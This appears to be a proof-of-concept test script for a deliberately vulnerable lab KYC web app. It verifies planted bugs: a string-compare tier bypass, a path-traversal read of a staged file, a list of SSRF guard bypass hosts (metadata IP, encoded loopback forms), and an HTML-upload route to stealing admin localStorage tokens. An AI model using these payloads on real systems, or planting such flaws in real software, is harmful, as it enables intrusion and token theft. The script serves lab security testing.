// Phase 2 PoC scratch. Verifies each planted vuln triggers at the
// code level without needing a running container. Run with:
//
//   pnpm tsx docs/phases/phase-2/poc-scratch.mjs

import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { randomBytes } from "node:crypto";

import { requireTier, TierError } from "../../../apps/web/lib/kyc-tier.ts";
import { mimeForFilename } from "../../../apps/web/lib/kyc-storage.ts";

// Stage a cwd with uploads + a known target file so V-14's
// path-traversal demo has something to read.
const stage = (() => {
  const dir = join(tmpdir(), `bvbe-poc-p2-${randomBytes(4).toString("hex")}`);
  mkdirSync(join(dir, "uploads", "kyc"), { recursive: true });
  writeFileSync(join(dir, "secret-host-data"), "LAB-MARKER-PHASE-2\n");
  return dir;
})();
process.chdir(stage);

// ---- V-27 lexicographic tier compare ----
// Both arguments must be strings to fire the lex compare. Phase 2
// only calls requireTier with a numeric `min`; Phase 4+ is expected
// to pass string labels. JS string compare on "3" < "10" is FALSE
// (because '3' > '1'), so a tier-3 user passes a tier-10 gate.
{
  let threw = false;
  try {
    requireTier({ kycTier: "3" }, "10");
  } catch (e) {
    if (e instanceof TierError) threw = true;
    else throw e;
  }
  console.log(
    `[V-27 lex tier] requireTier({tier:"3"}, "10") -> ` +
      `${threw ? "threw (good)" : "returned silently — BUG FIRES: tier-3 user passes tier-10 gate"}`,
  );

  let threw2 = false;
  try {
    requireTier({ kycTier: "2" }, "10");
  } catch {
    threw2 = true;
  }
  console.log(
    `[V-27 lex tier] requireTier({tier:"2"}, "10") -> ` +
      `${threw2 ? "threw (good)" : "returned silently — BUG FIRES: tier-2 user passes tier-10 gate"}`,
  );
}

// ---- V-14 path traversal (offline simulation) ----
{
  // Simulate what the handler does: join(UPLOADS_DIR, file) with no
  // normalization. We point at the staged secret file.
  const { readFileSync } = await import("node:fs");
  const UPLOADS_DIR = join(process.cwd(), "uploads", "kyc");
  const userControlledFile = "../../secret-host-data";
  const resolved = join(UPLOADS_DIR, userControlledFile);
  const bytes = readFileSync(resolved, "utf8");
  console.log(
    `[V-14 path traversal] read ${resolved.replace(stage, "<stage>")}: ${bytes.trim()}`,
  );
}

// ---- V-40 SSRF guard bypass enumeration ----
{
  function isLocalHost(host) {
    const h = host.toLowerCase();
    return h === "localhost" || h === "127.0.0.1" || h === "::1";
  }
  const bypasses = [
    "0.0.0.0",
    "169.254.169.254",
    "2130706433", // decimal for 127.0.0.1
    "0x7f000001", // hex for 127.0.0.1
    "017700000001", // octal
    "::ffff:127.0.0.1",
    "imds.bvbe.local",
    "bvbe-imds",
  ];
  for (const host of bypasses) {
    const blocked = isLocalHost(host);
    console.log(
      `[V-40 SSRF] hostname=${host.padEnd(22)} blocked=${blocked} ` +
        `(${blocked ? "GOOD" : "BYPASS — reaches mock IMDS or internal host"})`,
    );
  }
}

// ---- V-41 polyglot mime detection ----
{
  const cases = [
    ["passport.pdf", "application/pdf"],
    ["passport.png", "image/png"],
    ["evil.html", "text/html"], // polyglot vector
    ["evil.htm", "text/html"],
    ["evil.HTML", "text/html"], // case insensitive
    ["readme", "application/octet-stream"],
  ];
  for (const [name, expected] of cases) {
    const got = mimeForFilename(name);
    const marker = got === expected ? "OK" : "FAIL";
    console.log(
      `[V-41 polyglot mime] ${name.padEnd(16)} -> ${got.padEnd(28)} (${marker})`,
    );
  }
  console.log(
    "[V-41 polyglot mime] => upload 'evil.html' (type=address_proof), " +
      "admin review iframe loads it as text/html in same origin, " +
      "scripts read window.parent.localStorage['bvbe.access']",
  );
}

console.log("[poc] Phase 2 PoCs verified.");
